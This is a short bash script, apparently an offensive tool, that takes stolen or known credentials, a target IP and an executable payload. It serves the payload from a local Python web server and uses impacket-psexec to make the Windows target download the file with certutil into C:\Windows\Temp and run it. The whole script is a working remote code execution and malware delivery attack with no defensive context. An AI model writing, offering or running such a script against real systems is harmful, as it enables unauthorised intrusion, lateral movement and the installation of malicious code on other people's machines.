#!/bin/bash

# Check for the correct number of arguments
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <username> <password> <ip_address> <payload.exe>"
    exit 1
fi

# Assign the arguments to variables
username="$1"
password="$2"
ip_address="$3"
payload="$4"
serverip=$(curl -s ifconfig.me)
gnome-terminal -- /usr/bin/python3 -m http.server 80
echo "Started web server on ip $serverip"
command="cmd /c \"cd C:\Windows\Temp & certutil.exe -urlcache -split -f http://$serverip/$payload $payload & .\\$payload\""
echo "impacket-psexec $username":"$password"@"$ip_address" "$command"
impacket-psexec "$username":"$password"@"$ip_address" "$command"
